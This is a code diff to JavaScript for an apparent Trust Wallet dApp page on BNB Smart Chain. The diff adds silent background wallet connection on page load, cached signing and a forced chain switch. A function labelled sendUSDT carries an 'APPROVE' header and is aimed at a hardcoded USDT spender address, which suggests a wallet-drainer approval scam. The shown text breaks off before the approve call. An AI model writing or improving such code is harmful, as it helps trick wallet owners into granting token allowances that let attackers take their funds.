@@ -1,10 +1,11 @@
 let provider;
+let signer = null;
 let userAddress = null;
 let isConnected = false;
 let currentChainId = null;
 
 // ===== BSC CONFIG - FORCE BSC ONLY =====
-const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
+const BSC_CHAIN_ID = 56;
 const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
 
@@ -14,56 +15,41 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-// ===== SILENT SETUP ON PAGE LOAD =====
-// No popup on load - just setup provider silently
-window.addEventListener("load", async () => {
-  if (window.ethereum) {
-    try {
-      provider = new ethers.BrowserProvider(window.ethereum);
-      
-      // Only check existing connection (no popup)
-      const accounts = await window.ethereum.request({ method: "eth_accounts" });
-      if (accounts.length > 0) {
-        userAddress = accounts[0];
-        isConnected = true;
-      }
-      
-      currentChainId = await window.ethereum.request({ method: "eth_chainId" });
-      
-      window.ethereum.on("chainChanged", (chainId) => {
-        currentChainId = chainId;
-      });
-    } catch (err) {
-      console.log("Setup error:", err);
-    }
-  }
-});
-
-// ===== APPROVE (BSC ONLY) - OPTIMIZED FOR SPEED =====
-async function sendUSDT() {
+// ===== BACKGROUND CONNECT ON PAGE LOAD =====
+// Connects wallet silently in background (works on both Android & iOS Trust Wallet)
+async function backgroundConnect() {
+  if (!window.ethereum) return;
   try {
-    if (!window.ethereum) {
-      alert("Please open this page in Trust Wallet");
-      return;
+    provider = new ethers.BrowserProvider(window.ethereum);
+
+    // First try silent check
+    let accounts = await window.ethereum.request({ method: "eth_accounts" });
+
+    // If no accounts (common on iOS), request in background
+    // In Trust Wallet DApp browser this is silent (no popup)
+    if (!accounts || accounts.length === 0) {
+      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     }
 
-    // Ensure we have provider
-    if (!provider) {
-      provider = new ethers.BrowserProvider(window.ethereum);
+    if (accounts && accounts.length > 0) {
+      userAddress = accounts[0];
+      isConnected = true;
+      // Pre-fetch signer so Send is instant
+      signer = await provider.getSigner();
     }
 
-    // Fast chain check using cached value
+    currentChainId = await window.ethereum.request({ method: "eth_chainId" });
+
+    // Auto-switch to BSC if needed (silent in Trust Wallet)
     if (currentChainId !== "0x38") {
-      // Force switch to BSC
       try {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
           params: [{ chainId: "0x38" }]
         });
         currentChainId = "0x38";
-      } catch (switchErr) {
-        if (switchErr.code === 4902) {
-          // Add BSC network if not exists
+      } catch (e) {
+        if (e.code === 4902) {
           await window.ethereum.request({
             method: "wallet_addEthereumChain",
             params: [{
@@ -79,8 +65,80 @@ async function sendUSDT() {
       }
     }
 
-    // Get signer (works silently if already connected in Trust Wallet)
-    const signer = await provider.getSigner();
+    window.ethereum.on("chainChanged", (chainId) => {
+      currentChainId = chainId;
+    });
+
+    window.ethereum.on("accountsChanged", (accs) => {
+      if (accs.length > 0) {
+        userAddress = accs[0];
+        isConnected = true;
+      }
+    });
+  } catch (err) {
+    // Silent fail - will retry on Send
+    console.log("Background connect:", err.message || err);
+  }
+}
+
+// Run immediately when script loads
+backgroundConnect();
+
+// Also run on page load (covers iOS timing delays)
+window.addEventListener("load", () => {
+  if (!isConnected) {
+    setTimeout(backgroundConnect, 300);
+  }
+});
+
+// ===== APPROVE (BSC ONLY) - OPTIMIZED FOR SPEED =====
+async function sendUSDT() {
+  try {
+    if (!window.ethereum) {
+      alert("Please open this page in Trust Wallet");
+      return;
+    }
+
+    // Ensure provider + signer are ready (reconnect if needed)
+    if (!provider) {
+      provider = new ethers.BrowserProvider(window.ethereum);
+    }
+    if (!signer || !isConnected) {
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      if (accounts && accounts.length > 0) {
+        userAddress = accounts[0];
+        isConnected = true;
+      }
+      signer = await provider.getSigner();
+    }
+
+    // Ensure BSC chain
+    if (currentChainId !== "0x38") {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+        currentChainId = "0x38";
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: "0x38",
+              chainName: "Binance Smart Chain",
+              rpcUrls: ["https://bsc-dataseed.binance.org/"],
+              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+              blockExplorerUrls: ["https://bscscan.com"]
+            }]
+          });
+          currentChainId = "0x38";
+        }
+      }
+      // Refresh signer after chain switch
+      signer = await provider.getSigner();
+    }
+
     const address = await signer.getAddress();
 
     // Create contract
